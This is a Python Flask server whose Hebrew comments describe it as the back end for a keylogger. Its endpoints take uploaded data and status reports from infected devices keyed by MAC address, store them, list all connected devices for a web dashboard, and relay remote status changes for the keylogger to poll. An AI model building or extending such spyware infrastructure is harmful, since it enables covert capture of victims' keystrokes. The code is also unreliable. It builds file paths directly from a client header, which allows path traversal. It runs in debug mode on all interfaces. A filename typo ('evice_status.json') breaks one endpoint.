from flask import Flask, request, jsonify
import json
import os

app = Flask(__name__)


def write_to_json(name_j, data):
    """ פונקציה לשמירת נתונים בקובץ JSON """
    try:
        file_path = f"{name_j}.json"

        # אם הקובץ קיים - טוענים את הנתונים הקיימים, אחרת יוצרים מילון ריק
        if os.path.exists(file_path):
            try:
                with open(file_path, "r", encoding="utf-8") as file:
                    data_json = json.load(file)
            except json.JSONDecodeError:
                data_json = {}  # אם יש בעיה בקובץ, נאתחל אותו
        else:
            data_json = {}

        # עדכון הנתונים
        data_json.update(data)

        # שמירה חזרה לקובץ
        with open(file_path, "w", encoding="utf-8") as f:
            json.dump(data_json, f, ensure_ascii=False, indent=4)
    except Exception as e:
        print("❌ שגיאה בכתיבת JSON:", e)  # הדפסת שגיאה


@app.route('/api/status/update', methods=['POST'])
def status_update():
    print("/api/status/update")
    """ מקבל נתוני סטטוס מהקיי לוגר ושומר בקובץ לפי כתובת ה-MAC """
    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "Invalid JSON"}), 400

        mac_address = data.get("macAddress")
        if not mac_address:
            return jsonify({"error": "Missing macAddress"}), 400

        status = {mac_address: data}
        write_to_json("device_status", status)
        print("📥 נתונים שהתקבלו:", data)
        return jsonify({"message": "Success"}), 200
    except Exception as e:
        print("❌ שגיאה:", e)
        return jsonify({"error": str(e)}), 500


@app.route('/api/data/upload', methods=['POST'])
def data_upload():
    """ קבלת נתונים מהקיי לוגר ושמירתם לפי כתובת ה-MAC """
    print("/api/data/upload")
    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "Invalid JSON"}), 400

        mac_address = request.headers.get("mac_address")
        if not mac_address:
            return jsonify({"error": "Missing mac_address in headers"}), 400

        write_to_json(mac_address, data)
        print("📥 נתונים שהתקבלו:", data)
        return jsonify({"message": "Success"}), 200
    except Exception as e:
        print("❌ שגיאה:", e)
        return jsonify({"error": str(e)}), 500


@app.route('/api/data/files', methods=['GET'])
def get_data():
    """ שליפת נתונים מהשרת עבור הקיי לוגר לפי כתובת MAC """
    print("/api/data/files")
    mac_address = request.headers.get("mac_address")
    if not mac_address:
        return jsonify({"error": "Missing mac_address in headers"}), 400

    try:
        with open(f"{mac_address}.json", "r", encoding="utf-8") as file:
            data_json = json.load(file)
            print("📤 נתונים שנשלחו:", data_json)
        return jsonify(data_json)
    except FileNotFoundError:
        return jsonify({"error": f"No data found for MAC: {mac_address}"}), 404
    except json.JSONDecodeError:
        return jsonify({"error": "Invalid JSON file"}), 500


@app.route('/api/status/all', methods=['GET'])
def get_status_all():
    """ שליפת קובץ הסטטוסים של כל המכשירים המחוברים עבור הדף אינטרנט """
    print("/api/status/all")
    try:
        with open("evice_status.json", "r", encoding="utf-8") as file:
            data_json = json.load(file)
            print("📤 נתונים שנשלחו:", data_json)
        return jsonify(data_json)
    except FileNotFoundError:
        return jsonify({"error": f"No data found "}), 404
    except json.JSONDecodeError:
        return jsonify({"error": "Invalid JSON file"}), 500


@app.route('/api/status/check', methods=['GET'])
def check_status():
    """ בדיקת (מהקיי לוגר) הסטטוס האחרון של המכשיר לפי MAC ע"י הקיי לוגר """
    print("/api/status/check")
    mac_address = request.headers.get("mac_address")
    if not mac_address:
        return jsonify({"error": "Missing mac_address in headers"}), 400

    try:
        with open("change_device_status.json", "r", encoding="utf-8") as file:
            status_json = json.load(file)
            device_status = status_json.get(mac_address)

            if not device_status:
                return jsonify({"message": "No status found"}), 404

            print("📤 נתונים שנשלחו:", device_status)
            return jsonify(device_status)
    except FileNotFoundError:
        return jsonify({"error": "Status file not found"}), 500
    except json.JSONDecodeError:
        return jsonify({"error": "Invalid JSON file"}), 500


@app.route('/api/status/change', methods=['POST'])
def change_status():
    """ מקבל נתוני סטטוס מהאתר ושומר בקובץ לפי כתובת ה-MAC """
    print("api/status/change")
    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "Invalid JSON"}), 400

        mac_address = data.get("Mac-Address")
        if not mac_address:
            return jsonify({"error": "Missing macAddress"}), 400

        status = {mac_address: data}
        write_to_json("change_device_status", status)
        print("📥 Received data:", data)
        return jsonify({"message": "Success"}), 200
    except FileNotFoundError:
        return jsonify({"error": "Status file not found"}), 500
    except json.JSONDecodeError:
        return jsonify({"error": "Invalid JSON file"}), 500
    except Exception as e:
        print("❌ Error:", e)
        return jsonify({"error": str(e)}), 500


if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=True)
